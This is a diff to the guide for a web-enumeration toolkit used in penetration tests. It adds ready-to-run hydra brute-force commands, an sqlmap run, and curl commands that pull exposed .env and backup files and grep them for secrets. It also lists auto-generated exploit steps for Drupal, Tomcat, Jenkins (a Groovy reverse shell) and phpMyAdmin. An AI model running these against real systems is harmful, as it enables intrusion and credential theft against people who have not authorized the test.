@@ -78,7 +78,7 @@ cat $TOOLKIT_ROOT/web/192.168.50.100_80_http/artifacts/web/summary/summary.md
 cat $TOOLKIT_ROOT/web/192.168.50.100_80_http/artifacts/web/summary/quick_wins.txt
 ```
 
-`summary.md` is structured: tech stack → headers → sensitive paths → directory findings → vhosts → source hints. `quick_wins.txt` gives you just the high-value lines grouped by category.
+`summary.md` is structured: tech stack → headers → sensitive paths → directory findings → vhosts → source hints. `quick_wins.txt` gives you high-value lines grouped by category — and now includes **ready-to-run commands** for auth prompts (hydra), login forms (hydra http-post-form template), WordPress (wpscan), vhosts (re-run webenum per vhost), and parameters (sqlmap). Read it before going manual.
 
 ### Step 3: Found a Domain Name? → Vhost Fuzz
 
@@ -199,6 +199,11 @@ Output: `params/params_<endpoint>.json` + `.txt`
 
 Aggregates everything into `summary/summary.md` (structured report) and `summary/quick_wins.txt` (high-value lines only, grouped by category).
 
+`quick_wins.txt` now includes:
+- **robots.txt Disallow entries** — per-path `curl -w '%{http_code}'` probe commands (auto-generated, no placeholders)
+- **Sensitive files found** — resolved `curl -sk <url><path> -o /tmp/loot_<file>` commands for each actual 200-status sensitive file found
+- **CMS detection** — Joomla (`joomscan`), Drupal (`droopescan` + Drupalgeddon), Tomcat (WAR upload recipe), Jenkins (Groovy console RCE), phpMyAdmin (SQLi shell write) — specific attack commands per CMS
+
 ---
 
 ## Output Structure
@@ -316,20 +321,61 @@ http://10.10.10.5/admin               |    200 |     1234 |     56 |    12
 
 ## Common engagement Patterns
 
+> [!tip] Check quick_wins.txt first
+> For WordPress, login forms, 401 pages, and parameters — `quick_wins.txt` now has the ready-to-run command already built. Check it before going manual.
+
 ### WordPress Detected
 ```bash
-# webenum Phase 1 whatweb shows WordPress
-# Follow up with:
+# quick_wins.txt contains this command — copy it from there (URL is pre-filled)
 wpscan --url http://TARGET --enumerate ap,at,u --plugins-detection aggressive
 ```
 
 ### Login Page Found
 ```bash
-# Check for default creds, then look for:
-# - SQL injection in login form
-# - Password reset functionality
-# - User enumeration via error messages
-# - Timing-based user enumeration
+# quick_wins.txt contains a hydra http-post-form template for detected login forms
+# Adjust the form body and failure string, then run:
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+      http-post-form "TARGET:/login:user=^USER^&pass=^PASS^:Invalid"
+```
+
+### Auth-Required Pages (401)
+```bash
+# quick_wins.txt contains a hydra http-get command for each 401 path — copy from there
+hydra -L users.txt -P passwords.txt TARGET http-get /admin
+```
+
+### Parameter Found (--deep mode)
+```bash
+# quick_wins.txt contains a sqlmap command for parameters found by Phase 5 — copy from there
+sqlmap -u "http://TARGET/page?id=1" --batch --level 3 --risk 2
+```
+
+### robots.txt Disallow Entries Found
+```bash
+# quick_wins.txt now auto-generates per-path curl probes — e.g.:
+curl -sk -o /dev/null -w '%{http_code} http://TARGET/admin-panel\n' 'http://TARGET/admin-panel'
+# Copy these from quick_wins.txt — no manual retyping needed
+```
+
+### Non-WordPress CMS Detected
+
+`quick_wins.txt` prints specific attack commands automatically:
+
+| CMS | Commands Generated |
+|-----|--------------------|
+| Joomla | `joomscan --url`, admin login panel URL, hydra http-post-form template |
+| Drupal | `droopescan scan drupal -u`, version check via `CHANGELOG.txt`, Drupalgeddon msfconsole one-liner |
+| Tomcat | Manager panel URL, default creds check, WAR shell deploy + trigger sequence |
+| Jenkins | Script console URL, Groovy reverse shell code |
+| phpMyAdmin | Login URL, default creds, SQLi `SELECT INTO OUTFILE` shell write |
+
+### Sensitive Files Found (Resolved Paths)
+```bash
+# quick_wins.txt now uses actual found paths instead of <SENSITIVE_PATH> placeholder:
+curl -sk http://TARGET/backup.zip -o /tmp/loot_backup.zip && grep -iE 'pass|secret|key|user|db_' /tmp/loot_backup.zip
+curl -sk http://TARGET/.env -o /tmp/loot_.env && grep -iE 'pass|secret|key|user|db_' /tmp/loot_.env
+# Commands are specific to what was actually found — copy from quick_wins.txt
 ```
 
 ### API Endpoint Found (/api, /swagger.json)
